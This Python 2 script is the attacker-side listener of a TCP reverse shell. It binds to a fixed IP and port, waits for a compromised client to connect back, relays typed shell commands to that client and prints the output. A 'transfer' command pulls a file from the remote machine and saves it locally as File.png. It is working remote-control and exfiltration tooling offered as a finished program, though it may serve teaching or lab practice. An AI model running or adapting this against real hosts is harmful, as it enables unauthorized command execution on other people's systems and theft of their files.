'''
This program is to create a TCP reverse shell at the server side.
'''

import socket   #Will be used to build a TCP connection with the Server.
import os       #Will be used for file operations.


def TransferFile(conn, cmd):

    conn.send(cmd)
    f = open('/root/Desktop/File.png','wb')  #Create a file named File.png as a file holder.
    
    while True:                              #Goto infinite loop and start reading the receiving bytes 1 KB per iteration.
        buff = conn.recv(1024)
        
        if 'File not found' in buff:        #Break the loop if file does not exists.
            print 'Requested File Not Found.'      
            break
    
        if buff.endswith('Transferred'):    #Break the loop if Transferred is received as it marks the end of file.
            print 'File Transferred!'
            f.close()                       #Close the file
            break
        f.write(buff)                       #Store the received bytes in file holder .i.e. File.png.
    

    
def Connection():

    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Initiate a socket object.
    soc.bind(('10.110.151.46', 8080))                       #Define server IP address and listening port
    soc.listen(1)                                           #Define backlog size .i.e. server will listen to one connection at a time.                
    conn, addr = soc.accept()                               #accept() function will return connection object ID and client's ip address and port number.

    print 'Connection Established with ', addr


    while True:

        cmd = raw_input("RShell>> ")  #Get user input and store it in cmd variable.

        if 'terminate' in cmd:        #Close the Socket, break the loop and inform the client on receiving 'terminate' command'
            conn.send('terminate')
            conn.close()
            break

        elif 'transfer' in cmd:       #On receiving transfer command
            TransferFile(conn, cmd)   #call TransferFile() function.
            
        else:                         #Send the command to the client.
            conn.send(cmd)
            print conn.recv(1024)     #Print the output received from client.

            

def main():
    Connection()

main()
            
